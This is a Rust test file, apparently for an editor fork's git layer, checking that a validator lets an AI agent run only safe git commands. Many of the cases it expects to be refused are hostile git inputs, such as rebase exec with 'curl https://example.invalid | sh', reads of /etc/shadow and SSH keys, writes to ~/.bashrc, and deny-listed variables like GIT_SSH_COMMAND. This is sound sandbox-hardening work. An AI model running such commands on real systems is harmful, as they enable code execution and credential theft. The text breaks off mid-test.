        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("file.txt"), "base\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "initial"]);
        git_command(repo_dir.path(), ["checkout", "-b", "feature"]);
        fs::write(repo_dir.path().join("feature.txt"), "feature\n").unwrap();
        git_command(repo_dir.path(), ["add", "feature.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "feature"]);
        git_command(repo_dir.path(), ["checkout", "main"]);

        let repository = open_repository(repo_dir.path(), cx);
        let output = repository
            .run_command(
                vec!["merge".into(), "feature".into()],
                None,
                Arc::new(test_commit_envs()),
                HashMap::default(),
            )
            .await
            .unwrap();

        assert!(output.succeeded(), "{}", output.failure_message());
        assert!(repo_dir.path().join("feature.txt").exists());
        assert_eq!(
            git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]),
            git_command_output(repo_dir.path(), ["rev-parse", "feature"])
        );
    }

    #[gpui::test]
    async fn test_merge_reports_conflicts_instead_of_erroring(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("file.txt"), "base\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "initial"]);
        git_command(repo_dir.path(), ["checkout", "-b", "feature"]);
        fs::write(repo_dir.path().join("file.txt"), "feature\n").unwrap();
        git_command(repo_dir.path(), ["commit", "-am", "feature"]);
        git_command(repo_dir.path(), ["checkout", "main"]);
        fs::write(repo_dir.path().join("file.txt"), "main\n").unwrap();
        git_command(repo_dir.path(), ["commit", "-am", "main"]);

        let repository = open_repository(repo_dir.path(), cx);
        let output = repository
            .run_command(
                vec!["merge".into(), "feature".into()],
                None,
                Arc::new(test_commit_envs()),
                HashMap::default(),
            )
            .await
            .expect("a conflicted merge must not be reported as a failed command");

        assert!(!output.succeeded());
        assert!(
            output.stdout.contains("CONFLICT"),
            "unexpected stdout: {}",
            output.stdout
        );
    }

    #[gpui::test]
    async fn test_reset_hard_matches_the_remote_tracking_branch(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (_remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());

        fs::write(clone_directory.join("file.txt"), "local commit\n").unwrap();
        git_command(&clone_directory, ["commit", "-am", "local only"]);
        fs::write(clone_directory.join("file.txt"), "uncommitted\n").unwrap();

        let repository = open_repository(&clone_directory, cx);
        let output = repository
            .run_command(
                vec!["reset".into(), "--hard".into(), "origin/main".into()],
                None,
                Arc::new(HashMap::default()),
                HashMap::default(),
            )
            .await
            .unwrap();

        assert!(output.succeeded(), "{}", output.failure_message());
        assert_eq!(
            fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
            "main"
        );
        assert_eq!(
            git_command_output(&clone_directory, ["rev-parse", "HEAD"]),
            git_command_output(&clone_directory, ["rev-parse", "origin/main"])
        );
    }

    #[test]
    fn test_tag_distance_parse() {
        assert_eq!(
            TagDistance::parse("v1.2.3-5-gabcdef\n"),
            Some(TagDistance {
                tag: "v1.2.3".into(),
                commits_since: 5,
                short_sha: "abcdef".into(),
            })
        );
        // `--long` still prints the count on the tagged commit itself.
        assert_eq!(
            TagDistance::parse("v1.2.3-0-g0123456").map(|distance| distance.commits_since),
            Some(0)
        );
        // A tag name may contain the separator, so the fields are read from the right.
        assert_eq!(
            TagDistance::parse("release-1.0-12-gdeadbee"),
            Some(TagDistance {
                tag: "release-1.0".into(),
                commits_since: 12,
                short_sha: "deadbee".into(),
            })
        );
        assert_eq!(TagDistance::parse("v1.2.3"), None);
        assert_eq!(TagDistance::parse("v1.2.3-5-abcdef"), None);
        assert_eq!(TagDistance::parse(""), None);
    }

    #[test]
    fn test_tag_info_parse_list() {
        let annotated = "refs/tags/v2.0.0\u{0}tag\u{0}aaaa1111\u{0}bbbb2222\u{0}1700000000 +0900\u{0}リリース 2.0";
        let lightweight =
            "refs/tags/v1.0.0\u{0}commit\u{0}cccc3333\u{0}\u{0}1600000000 +0000\u{0}最初の版";
        let without_date = "refs/tags/wip\u{0}commit\u{0}dddd4444\u{0}\u{0}\u{0}";
        // Tag names may be anything git allows, including multi-byte text and a nested path;
        // only the `refs/tags/` in front is taken off.
        let nested_multibyte =
            "refs/tags/リリース/春\u{0}commit\u{0}eeee5555\u{0}\u{0}1650000000 +0900\u{0}";
        // Not a tag: dropped rather than shown under a made-up name.
        let not_a_tag = "refs/heads/main\u{0}commit\u{0}ffff6666\u{0}\u{0}1650000000 +0900\u{0}";
        let tags = TagInfo::parse_list(&format!(
            "{annotated}\n{lightweight}\r\n{without_date}\n{nested_multibyte}\n{not_a_tag}\nrefs/tags/\u{0}commit\u{0}abcd\n"
        ));

        assert_eq!(
            tags,
            vec![
                TagInfo {
                    name: "v2.0.0".into(),
                    // The peeled commit, not the tag object.
                    commit_sha: "bbbb2222".into(),
                    created_at_unix: Some(1_700_000_000),
                    subject: Some("リリース 2.0".into()),
                    commit_subject: None,
                    annotated: true,
                },
                TagInfo {
                    name: "v1.0.0".into(),
                    commit_sha: "cccc3333".into(),
                    created_at_unix: Some(1_600_000_000),
                    subject: None,
                    commit_subject: Some("最初の版".into()),
                    annotated: false,
                },
                TagInfo {
                    name: "wip".into(),
                    commit_sha: "dddd4444".into(),
                    created_at_unix: None,
                    subject: None,
                    commit_subject: None,
                    annotated: false,
                },
                TagInfo {
                    name: "リリース/春".into(),
                    commit_sha: "eeee5555".into(),
                    created_at_unix: Some(1_650_000_000),
                    subject: None,
                    commit_subject: None,
                    annotated: false,
                },
            ]
        );
        assert_eq!(tags[0].rev(), "refs/tags/v2.0.0");
        assert_eq!(tags[3].rev(), "refs/tags/リリース/春");
    }

    #[test]
    fn test_adapt_command_to_git_version() {
        let switch: Vec<String> = ["switch", "-c", "mr/1", "main"]
            .into_iter()
            .map(str::to_string)
            .collect();
        let modern = adapt_command_to_git_version(switch.clone(), Some(GitVersion::new(2, 47, 0)));
        assert_eq!(modern.args, switch);
        assert!(!modern.dropped_autostash);

        let old = adapt_command_to_git_version(switch.clone(), Some(GitVersion::new(2, 17, 1)));
        assert_eq!(old.args, vec!["checkout", "-b", "mr/1", "main"]);

        // An unrecognized version counts as a modern git, like everywhere else.
        assert_eq!(adapt_command_to_git_version(switch, None).args[0], "switch");

        let rebase: Vec<String> = ["rebase", "--autostash", "--onto", "new", "old", "main"]
            .into_iter()
            .map(str::to_string)
            .collect();
        let modern = adapt_command_to_git_version(rebase.clone(), Some(GitVersion::new(2, 6, 0)));
        assert_eq!(modern.args, rebase);
        assert!(!modern.dropped_autostash);

        let old = adapt_command_to_git_version(rebase, Some(GitVersion::new(2, 5, 0)));
        assert_eq!(old.args, vec!["rebase", "--onto", "new", "old", "main"]);
        assert!(
            old.dropped_autostash,
            "dropping the flag has to be reported, or the rebase would run on a dirty worktree"
        );
    }

    #[test]
    fn test_git_command_env_allowlist() {
        let author = HashMap::from_iter([
            ("GIT_AUTHOR_NAME".to_string(), "Ada".to_string()),
            (
                "GIT_AUTHOR_EMAIL".to_string(),
                "ada@example.com".to_string(),
            ),
            (
                "GIT_AUTHOR_DATE".to_string(),
                "1700000000 +0900".to_string(),
            ),
        ]);
        validate_git_command_env(&author).expect("the commit-tree author variables are allowed");

        for name in [
            "GIT_EDITOR",
            "GIT_SEQUENCE_EDITOR",
            "GIT_SSH_COMMAND",
            "GIT_EXTERNAL_DIFF",
            "PATH",
        ] {
            let error = validate_git_command_env(&HashMap::from_iter([(
                name.to_string(),
                "arbitrary-program".to_string(),
            )]))
            .expect_err("{name} names a program git would run");
            assert!(
                error.to_string().contains(name),
                "unexpected error: {error:#}"
            );
        }
    }

    #[test]
    fn test_validate_agent_git_command() {
        let command = |args: &[&str]| -> Vec<String> {
            args.iter().map(|argument| argument.to_string()).collect()
        };
        for args in [
            vec!["commit", "-m", "Fix the parser"],
            vec!["commit", "-am", "Fix the parser"],
            vec!["commit", "--amend", "--message=Fix the parser"],
            // A message is free text, whatever is in it, as long as it does not start with `-`.
            vec![
                "commit",
                "-m",
                "Handle -s and --recurse-submodules",
                "--no-edit",
            ],
            vec!["commit", "-i", "src", "-m", "x"],
            vec!["add", "--", "-s"],
            vec!["switch", "-c", "feature"],
            vec!["checkout", "--no-recurse-submodules", "main"],
            vec!["merge", "--no-ff", "--strategy-option=theirs", "feature"],
            vec!["merge", "--stat", "feature"],
            vec!["cherry-pick", "-s", "HEAD~1"],
            vec!["revert", "-s", "HEAD"],
            vec!["log", "-s", "--oneline"],
            vec!["rebase", "--root"],
            vec!["reset", "--hard", "HEAD~1"],
            vec!["add", "-A"],
            vec!["add", "-N", "new.rs"],
            vec!["add", "--ignore-errors", "src"],
            vec!["checkout", "-b", "feature", "main"],
            vec!["checkout", "--progress", "main"],
            vec!["log", "-p", "-1"],
            vec!["show", "--patch", "HEAD"],
        ] {
            let args = command(&args);
            assert!(
                validate_agent_git_command(&args).is_ok(),
                "{args:?} should be allowed"
            );
        }
        for args in [
            // What the git panel needs and an agent does not.
            vec!["commit-tree", "HEAD^{tree}", "-m", "x"],
            vec!["pack-refs", "--all"],
            // Submodules, whose configuration is not looked at for every command.
            vec!["checkout", "--recurse-submodules", "main"],
            vec!["switch", "--recurse-submodules=yes", "main"],
            vec!["checkout", "--recurse", "main"],
            // A merge strategy is a program git finds by name.
            vec!["merge", "-s", "evil", "feature"],
            vec!["merge", "-sevil", "feature"],
            vec!["merge", "-ns", "evil", "feature"],
            vec!["merge", "--strategy=evil", "feature"],
            vec!["rebase", "--strat", "evil", "main"],
            vec!["rebase", "-s", "evil", "main"],
            vec!["cherry-pick", "--strategy", "evil", "HEAD~1"],
            vec!["revert", "--strategy=evil", "HEAD"],
            // An index file written wherever the agent says.
            vec!["apply", "--build-fake-ancestor=../index", "change.patch"],
            vec!["apply", "--build", "../index", "change.patch"],
            // A commit that would prepare a message for the editor, which can write the staged
            // diff into it through the repository's textconv programs.
            vec!["commit"],
            vec!["commit", "--amend"],
            vec!["commit", "-v", "-m", "x"],
            vec!["commit", "-avm", "x"],
            vec!["commit", "-e", "-m", "x"],
            vec!["commit", "--verb", "-m", "x"],
            vec!["commit", "--edit", "-m", "x"],
            vec!["commit", "-c", "HEAD"],
            vec!["commit", "--template=notes", "-m", "x"],
            // Picking hunks waits for a terminal and shows them through the repository's diff
            // configuration; `add -e` opens an editor.
            vec!["add", "-p"],
            vec!["add", "--patch", "src"],
            vec!["add", "--pat"],
            vec!["add", "-Ap"],
            vec!["add", "-i"],
            vec!["add", "--interactive"],
            vec!["add", "-ue"],
            vec!["add", "-e"],
            vec!["add", "--edit"],
            vec!["checkout", "-p", "main"],
            vec!["checkout", "--patch", "main", "--", "src"],
            vec!["reset", "-p"],
            vec!["reset", "--patch", "HEAD"],
            vec!["commit", "-p", "-m", "x"],
            vec!["commit", "--interactive", "-m", "x"],
            vec!["commit", "--int", "-m", "x"],
            vec!["commit", "--e", "-m", "x"],
            // An option that takes a value takes `-m` or `--` as it, and git reads the argument
            // after that as an option; so a message or a path that looks like an option is
            // refused as well.
            vec!["merge", "-X", "-m", "-s", "evil", "feature"],
            vec!["merge", "-X", "--", "-s", "evil", "feature"],
            vec![
                "commit",
                "--allow-empty",
                "--trailer",
                "-m",
                "--file=/etc/passwd",
            ],
            vec!["commit", "--trailer", "-m", "-v", "-m", "x"],
            vec!["checkout", "-b", "--", "-p", "main"],
            vec!["commit", "-m", "-v -e", "--no-edit"],
            vec!["commit", "-m", "--recurse-submodules -s ours"],
            vec!["commit", "-m", "-p --patch"],
            vec!["reset", "-q", "HEAD", "--", "-p"],
            // Whatever any caller is refused.
            vec!["rebase", "--exec", "touch /tmp/pwned", "HEAD~2"],
            vec!["push", "origin", "main"],
            vec!["fetch"],
        ] {
            let args = command(&args);
            assert!(
                validate_agent_git_command(&args).is_err(),
                "{args:?} should be refused"
            );
        }
    }

    /// ADR-F90: an agent's command runs as in an untrusted repository whatever the project's
    /// trust, so a hook in the working tree (husky's `core.hooksPath`), which the agent can
    /// write from its sandbox, never runs outside it.
    #[gpui::test]
    async fn test_run_command_without_hooks_runs_no_hook_in_a_trusted_repository(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();
        if !installed_git_supports(GitFeature::HooksPath) {
            return;
        }

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let hooks_dir = repo_dir.path().join(".husky");
        fs::create_dir_all(&hooks_dir).unwrap();
        for hook in ["pre-commit", "commit-msg", "post-commit", "post-checkout"] {
            let path = hooks_dir.join(hook);
            fs::write(
                &path,
                format!("#!/bin/sh\necho {hook} >> hooks-that-ran\nexit 1\n"),
            )
            .unwrap();
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt as _;
                fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
        }
        git_command(repo_dir.path(), ["config", "core.hooksPath", ".husky"]);
        fs::write(repo_dir.path().join(".gitignore"), "hooks-that-ran\n").unwrap();
        fs::write(repo_dir.path().join("file"), "one\n").unwrap();

        let repository = open_repository(repo_dir.path(), cx);
        repository.set_trusted(true);
        let env = Arc::new(test_commit_envs());
        let run_without_hooks = |args: &[&str]| {
            repository.run_command_without_hooks(
                args.iter().map(|argument| argument.to_string()).collect(),
                None,
                env.clone(),
                HashMap::default(),
            )
        };
        let hooks_that_ran =
            || fs::read_to_string(repo_dir.path().join("hooks-that-ran")).unwrap_or_default();

        for args in [
            &["add", "file", ".gitignore"][..],
            &["commit", "-m", "first"],
            &["switch", "-c", "feature"],
        ] {
            let output = run_without_hooks(args).await.unwrap();
            assert!(output.succeeded(), "{args:?}: {output:?}");
        }
        assert_eq!(hooks_that_ran(), "", "no hook may run");
        assert_eq!(
            git_command_output(repo_dir.path(), ["log", "-1", "--pretty=%s"]),
            "first"
        );

        // The same commit through `run_command` runs the trusted repository's hooks, so the
        // hooks above are ones git would have run.
        fs::write(repo_dir.path().join("file"), "two\n").unwrap();
        run_without_hooks(&["add", "file"]).await.unwrap();
        let output = repository
            .run_command(
                vec!["commit".into(), "-m".into(), "second".into()],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(!output.succeeded(), "the pre-commit hook fails the commit");
        assert_eq!(hooks_that_ran(), "pre-commit\n");
    }

    /// ADR-F90: the repository's `core.worktree`, which the agent controls in a repository it set
    /// up from its sandbox, does not move an agent's command out of the working directory.
    #[gpui::test]
    async fn test_run_command_without_hooks_ignores_core_worktree(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        let elsewhere = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("file"), "one\n").unwrap();
        git_command(repo_dir.path(), ["add", "file"]);
        let env = Arc::new(test_commit_envs());
        let repository = open_repository(repo_dir.path(), cx);
        let output = repository
            .run_command_without_hooks(
                vec!["commit".into(), "-m".into(), "first".into()],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(output.succeeded(), "{output:?}");
        fs::write(repo_dir.path().join("file"), "changed\n").unwrap();
        git_command(
            repo_dir.path(),
            [
                "config",
                "core.worktree",
                elsewhere.path().to_str().unwrap(),
            ],
        );

        let output = repository
            .run_command_without_hooks(
                vec!["checkout".into(), "HEAD".into(), "--".into(), "file".into()],
                None,
                env,
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(output.succeeded(), "{output:?}");
        assert!(
            !elsewhere.path().join("file").exists(),
            "nothing is written to core.worktree"
        );
        assert_eq!(
            fs::read_to_string(repo_dir.path().join("file")).unwrap(),
            "one\n"
        );
    }

    #[gpui::test]
    async fn test_run_command_without_hooks_refuses_a_git_that_cannot_disable_them(
        cx: &mut TestAppContext,
    ) {
        let old_git = pretend_git_binary("git-2.8-for-agent", GitVersion::new(2, 8, 0), true, cx);
        let error = old_git
            .ensure_hooks_can_be_disabled()
            .await
            .expect_err("git 2.8 ignores core.hooksPath");
        assert!(
            error.to_string().contains("cannot turn off hooks"),
            "{error:#}"
        );

        // Before anything is run, so before the made-up binary path could fail to start.
        disable_git_global_config();
        cx.executor().allow_parking();
        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repository = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git-2.8-for-agent".into()),
            cx.executor(),
        )
        .unwrap();
        repository.set_trusted(true);
        let error = repository
            .run_command_without_hooks(
                vec!["log".into()],
                None,
                Arc::new(HashMap::default()),
                HashMap::default(),
            )
            .await
            .expect_err("git 2.8 ignores core.hooksPath");
        assert!(
            error.to_string().contains("cannot turn off hooks"),
            "{error:#}"
        );

        // A trusted repository is no exception, unlike `ensure_hooks_are_disabled_if_untrusted`.
        old_git
            .ensure_hooks_are_disabled_if_untrusted("Commit")
            .await
            .expect("the trusted repository's own operations still run");

        let new_git = pretend_git_binary("git-2.9-for-agent", GitVersion::new(2, 9, 0), true, cx);
        new_git.ensure_hooks_can_be_disabled().await.unwrap();

        let unknown_git = GitBinary::new(
            PathBuf::from("git-that-does-not-exist-for-agent"),
            PathBuf::from("/"),
            PathBuf::from("/.git"),
            cx.executor(),
            true,
        );
        let error = unknown_git
            .ensure_hooks_can_be_disabled()
            .await
            .expect_err("a git of unknown version may not be able to");
        assert!(
            error.to_string().contains("could not be determined"),
            "{error:#}"
        );
    }

    /// `run_command` is reachable over RPC, so an allowed subcommand must not be usable to start
    /// a program or to reach a path outside the repository.
    #[test]
    fn test_validate_git_command_refuses_arguments_that_reach_outside_the_repository() {
        let command = |args: &[&str]| -> Vec<String> {
            args.iter().map(|argument| argument.to_string()).collect()
        };

        for args in [
            // Runs the command once per commit.
            vec![
                "rebase",
                "-x",
                "curl https://example.invalid | sh",
                "HEAD~2",
            ],
            vec!["rebase", "--exec", "touch /tmp/pwned", "HEAD~2"],
            vec!["rebase", "--exec=touch /tmp/pwned", "HEAD~2"],
            // A short option carries its value attached, and bundles with other flags.
            vec!["rebase", "-xtouch /tmp/pwned", "HEAD~2"],
            vec!["rebase", "-ix", "touch /tmp/pwned", "HEAD~2"],
            // Writes over any file the host user can write.
            vec!["log", "--output=/home/user/.bashrc"],
            vec!["diff", "--output", "/home/user/.bashrc"],
            // Reads any file the host user can read back out through `log`.
            vec!["commit", "-F/etc/shadow"],
            vec!["tag", "--file=/etc/shadow", "v1"],
            // Echoes each line of any readable file back in "did not match any files".
            vec!["add", "--pathspec-from-file=/etc/shadow"],
            vec!["commit", "--pathspec-from-file", "/etc/shadow", "-m", "x"],
            // Runs whatever the repository's own configuration names.
            vec!["show", "--ext-diff"],
            vec!["log", "--help"],
            vec!["log", "-p", "--submodule=diff"],
            vec!["diff", "--submod=diff"],
            // git accepts any unambiguous prefix of a long option as the option itself.
            vec!["rebase", "--exe", "touch /tmp/pwned", "HEAD~2"],
            vec!["rebase", "--exe=touch /tmp/pwned", "HEAD~2"],
            vec!["add", "--pathspec-from=/etc/shadow"],
            vec!["tag", "--fil=/etc/shadow", "v1"],
            vec!["format-patch", "--output-dir=/home/user", "-1"],
            vec!["show", "--ext", "HEAD"],
            // Prints any file the host user can read.
            vec!["diff", "--no-index", "/etc/shadow", "/dev/null"],
            // Writes the patch on stdin outside the working tree.
            vec!["apply", "--unsafe-paths", "-"],
            vec!["apply", "--unsafe", "-"],
            // Writes a patch file into any directory.
            vec!["format-patch", "-o", "/home/user/.config/autostart", "-1"],
            vec!["format-patch", "-ko/tmp", "-1"],
            // A bundle whose refused flag takes the rest of the argument as its value.
            vec!["rebase", "-ixsh /tmp/pwned.sh", "HEAD~2"],
            vec!["commit", "-aF/etc/shadow"],
            // `diff` given a path outside the working tree compares the files as `--no-index`
            // would, on either side of `--`.
            vec!["diff", "/etc/shadow", "x"],
            vec!["diff", "--", "x", "/etc/shadow"],
            vec!["diff", "../../etc/shadow", "x"],
            vec!["diff", "src/../../secret", "x"],
            vec!["diff", "src\\..\\..\\secret", "x"],
            vec!["diff", "..", "x"],
            vec!["diff", "C:\\Windows\\win.ini", "x"],
            vec!["diff", "c:secret", "x"],
            vec!["diff", "\\\\server\\share\\secret", "x"],
            vec!["diff", "~/.ssh/id_ed25519", "x"],
            // Reads any file as ignore patterns; which files it lists gives the lines away.
            vec![
                "ls-files",
                "--others",
                "--ignored",
                "--exclude-from=/etc/shadow",
            ],
            vec![
                "ls-files",
                "--others",
                "--ignored",
                "--exclude-fr",
                "/etc/shadow",
            ],
            vec![
                "ls-files",
                "--exclude-per-directory=../../../etc/shadow",
                "-o",
                "-i",
            ],
            vec!["ls-files", "--exclude-per", "shadow", "-o", "-i"],
            vec!["ls-files", "-X", "/etc/shadow", "-o", "-i"],
            vec!["ls-files", "-oiX/etc/shadow"],
        ] {
            let error = validate_git_command(&command(&args))
                .expect_err("this argument names a program or a path outside the repository");
            assert!(
                error.to_string().contains("argument"),
                "unexpected error for {args:?}: {error:#}"
            );
        }

        // The commands the wrappers in this fork actually build stay allowed, including a commit
        // message that looks like an option.
        for args in [
            vec!["commit", "--amend", "--only", "-m", "- fixed the parser"],
            vec![
                "commit-tree",
                "abc^{tree}",
                "-p",
                "def",
                "-m",
                "-x marks it",
            ],
            vec!["cherry-pick", "-n", "abc", "def"],
            vec!["rebase", "--autostash", "--onto", "new", "old", "main"],
            vec!["switch", "-c", "mr/1", "origin/main"],
            vec!["format-patch", "--binary", "--stdout", "-1", "HEAD"],
            vec![
                "log",
                "-1",
                "--format=%an%x00%ae%x00%ad",
                "--date=raw",
                "abc",
            ],
            vec!["for-each-ref", "--sort=-creatordate", "refs/tags/"],
            vec!["reset", "--hard", "origin/main"],
            // Exact names that merely start like a refused option, and the `--` separator.
            vec!["diff", "--text", "--no-ext-diff", "--no-textconv", "HEAD"],
            vec!["add", "--", ":(literal)docs/a.md"],
            // Revision ranges have no separator around their dots, and the `diff`s the git
            // panel builds name paths relative to the repository.
            vec!["diff", "HEAD..main", "--", "src/x"],
            vec!["diff", "--name-status", "origin/main...feature/x"],
            vec!["diff", "..main", "HEAD.."],
            vec!["diff", "HEAD", "--name-only", "--", ":(literal)src/a..b.rs"],
            vec!["diff", "--name-only", "--diff-filter=U"],
            vec!["diff", "--cached", "--raw", "--no-abbrev"],
            vec!["diff", "--binary", "--cached"],
            vec![
                "ls-files",
                "--others",
                "--ignored",
                "--exclude-standard",
                "-z",
                "--",
                ":(top,literal).env",
            ],
            // Only `diff` compares files outside the repository by itself.
            vec!["log", "--format=%H", "--", "../moved.rs"],
        ] {
            validate_git_command(&command(&args))
                .unwrap_or_else(|error| panic!("{args:?} must stay allowed: {error:#}"));
        }
    }

    /// `--skip` is the one button on the git panel's banner that older git cannot answer.
    #[test]
    fn test_sequencer_skip_needs_a_new_enough_git() {
        let skip = |subcommand: &str| vec![subcommand.to_string(), "--skip".to_string()];

        for subcommand in ["cherry-pick", "revert"] {
            let error = ensure_arguments_are_supported(
                subcommand,
                &skip(subcommand),
                Some(GitVersion::new(2, 21, 0)),
            )
            .expect_err("git 2.21 has no --skip for the sequencer");
            assert!(
                error.to_string().contains("2.22.0"),
                "unexpected error: {error:#}"
            );
            ensure_arguments_are_supported(
                subcommand,
                &skip(subcommand),
                Some(GitVersion::new(2, 22, 0)),
            )
            .expect("git 2.22 learned it");
            ensure_arguments_are_supported(subcommand, &skip(subcommand), None)
                .expect("an unrecognized version counts as a modern git");
        }

        ensure_arguments_are_supported("rebase", &skip("rebase"), Some(GitVersion::new(1, 8, 3)))
            .expect("`rebase --skip` predates every version this fork supports");
        ensure_arguments_are_supported(
            "cherry-pick",
            &["cherry-pick".to_string(), "--continue".to_string()],
            Some(GitVersion::new(2, 21, 0)),
        )
        .expect("only --skip is new");
    }

    /// The hook guard can only fire for commands `run_command` accepts in the first place.
    #[test]
    fn test_hook_running_commands_are_all_allowed() {
        for subcommand in HOOK_RUNNING_GIT_COMMANDS {
            assert!(
                ALLOWED_GIT_COMMANDS.contains(subcommand),
                "{subcommand} runs hooks but is not in the allowlist"
            );
        }
        for subcommand in ALLOWED_GIT_COMMANDS {
            assert_eq!(
                hook_running_operation_name(subcommand).is_some(),
                HOOK_RUNNING_GIT_COMMANDS.contains(subcommand),
                "{subcommand} needs a name exactly when it runs hooks"
            );
        }
    }

    #[gpui::test]
    async fn test_run_command_rejects_environment_outside_the_allowlist(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repository = open_repository(repo_dir.path(), cx);

        let error = repository
            .run_command(
                vec!["diff".into()],
                None,
                Arc::new(HashMap::default()),
                HashMap::from_iter([(
                    "GIT_SSH_COMMAND".to_string(),
                    "arbitrary-program".to_string(),
                )]),
            )
            .await
            .expect_err("environment variables outside the allowlist must be rejected");
        assert!(
            error.to_string().contains("GIT_SSH_COMMAND"),
            "unexpected error: {error:#}"
        );
    }

    /// Given a path outside the working tree, `diff` compares the files themselves even without
    /// `--no-index`, which is how the real git would print any readable file; `run_command`
    /// refuses the path, while a revision range over a path inside still works.
    #[gpui::test]
    async fn test_run_command_refuses_a_diff_of_a_file_outside_the_repository(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let secret = temp_dir.path().join("secret.txt");
        fs::write(&secret, "the host's secret\n").unwrap();
        fs::create_dir_all(repo_dir.join("src")).unwrap();
        fs::write(repo_dir.join("src/x"), "one\n").unwrap();
        git_command(&repo_dir, ["add", "src/x"]);
        git_command(&repo_dir, ["commit", "-m", "first"]);
        fs::write(repo_dir.join("src/x"), "two\n").unwrap();
        git_command(&repo_dir, ["commit", "-am", "second"]);

        // What the refusal stands in the way of (exit code 1: the files differ).
        #[allow(clippy::disallowed_methods)]
        let unguarded = std::process::Command::new("git")
            .args(["diff", "../secret.txt", "src/x"])
            .current_dir(&repo_dir)
            .env("GIT_CONFIG_GLOBAL", "")
            .env("GIT_CONFIG_SYSTEM", "")
            .output()
            .expect("failed to run git command");
        assert!(
            String::from_utf8_lossy(&unguarded.stdout).contains("the host's secret"),
            "git itself diffs a file outside the repository"
        );

        let repository = open_repository(&repo_dir, cx);
        let run = |args: Vec<String>| {
            repository.run_command(args, None, Arc::new(HashMap::default()), HashMap::default())
        };
        for outside in [
            "../secret.txt".to_string(),
            secret.to_string_lossy().into_owned(),
        ] {
            let error = run(vec!["diff".into(), outside.clone(), "src/x".into()])
                .await
                .expect_err("a path outside the repository must be refused");
            assert!(
                error.to_string().contains("argument"),
                "unexpected error for {outside}: {error:#}"
            );
        }

        let diff = run(vec![
            "diff".into(),
            "HEAD~1..main".into(),
            "--".into(),
            "src/x".into(),
        ])
        .await
        .unwrap();
        assert!(diff.succeeded(), "{}", diff.failure_message());
        assert!(diff.stdout.contains("+two"), "{}", diff.stdout);
    }

    /// An untrusted repository's own configuration names programs for diffs to run (an external
    /// diff, a diff driver's command, a textconv filter). None of them may start, and the patches
    /// still come out: the emptied `diff.external` alone makes git 2.47 fail them with
    /// `cannot spawn :`, including a `diff` whose pathspec follows `--`.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_diff_programs(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        fs::write(repo_dir.join("f"), "one\n").unwrap();
        git_command(&repo_dir, ["add", "f"]);
        git_command(&repo_dir, ["commit", "-m", "first"]);
        fs::write(repo_dir.join("f"), "two\n").unwrap();
        git_command(&repo_dir, ["commit", "-am", "second"]);
        fs::write(repo_dir.join("f"), "three\n").unwrap();

        let marker = temp_dir.path().join("program-ran");
        let record_run = format!(
            "echo ran >> '{}'",
            marker.to_string_lossy().replace('\\', "/")
        );
        let textconv = format!("{record_run}; cat");
        let external = format!("{record_run}; true");
        git_command(
            &repo_dir,
            ["config", "diff.evil.textconv", textconv.as_str()],
        );
        git_command(
            &repo_dir,
            ["config", "diff.evil.command", external.as_str()],
        );
        git_command(&repo_dir, ["config", "diff.external", external.as_str()]);
        fs::write(repo_dir.join(".git/info/attributes"), "f diff=evil\n").unwrap();
        for args in [vec!["diff"], vec!["diff", "--no-ext-diff"]] {
            git_command_output(&repo_dir, &args);
            assert!(
                marker.exists(),
                "the installed git runs the repository's programs for {args:?}"
            );
            fs::remove_file(&marker).unwrap();
        }

        let repository = open_repository(&repo_dir, cx);
        if repository.is_trusted() {
            // A git too old to disable hooks has the test repository trusted.
            return;
        }
        for (args, expected) in [
            (PatchSource::Worktree.args(), "+three"),
            (
                vec![
                    "diff".to_string(),
                    "HEAD~1".to_string(),
                    "HEAD".to_string(),
                    "--".to_string(),
                    "f".to_string(),
                ],
                "+two",
            ),
            (
                vec!["log".to_string(), "-p".to_string(), "-1".to_string()],
                "+two",
            ),
            (vec!["show".to_string(), "HEAD".to_string()], "+two"),
        ] {
            let output = repository
                .run_command(
                    args.clone(),
                    None,
                    Arc::new(HashMap::default()),
                    HashMap::default(),
                )
                .await
                .unwrap();
            assert!(output.succeeded(), "{args:?}: {}", output.failure_message());
            assert!(
                output.stdout.contains(expected),
                "{args:?}: {}",
                output.stdout
            );
            assert!(
                !marker.exists(),
                "{args:?} ran the repository's diff program"
            );
